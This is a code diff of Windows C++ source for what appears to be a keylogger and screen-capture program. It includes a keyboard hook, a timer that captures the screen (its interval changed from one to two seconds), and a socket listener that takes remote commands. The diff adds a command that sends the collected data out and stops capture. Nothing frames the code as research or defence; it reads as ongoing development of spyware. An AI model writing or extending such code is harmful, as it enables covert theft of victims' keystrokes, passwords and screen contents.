@@ -6,18 +6,16 @@
 #include <gdiplus.h>
 #include <thread>
 #include <Shlobj.h>
-#define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <stdio.h>
 #include <time.h>
 #include <string>
 #include <codecvt>   // For std::codecvt_utf8
 #include <locale>    // For std::wstring_convert
-#pragma comment(lib, "ws2_32.lib")
 #include <PathCch.h>
-#pragma comment(lib, "Pathcch.lib")
 #include <mutex>
 #include <Shellapi.h>
 #define MAX_PATH 260
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 void Save(const char* text);
@@ -52,7 +50,7 @@ int main() {
         return 1;
     }
 
-    UINT_PTR timerId = SetTimer(NULL, 0, 1000, (TIMERPROC)CaptureScreenAndSave);
+    UINT_PTR timerId = SetTimer(NULL, 0, 2000, (TIMERPROC)CaptureScreenAndSave);
     if (timerId == 0) {
         std::cerr << "Failed to set up timer\n";
         return 1;
@@ -464,6 +462,12 @@ void listenThread() {
                 std::thread st(sendThread);  // Create a thread
                 st.join();
                 on = true;
+            }
+            else if (strcmp(recvdata, "4") == 0) {
+                // send & delete & stop thread
+                on = false;
+                std::thread st(sendThread);  // Create a thread
+                st.join();
             }
             else {
                 // copy data
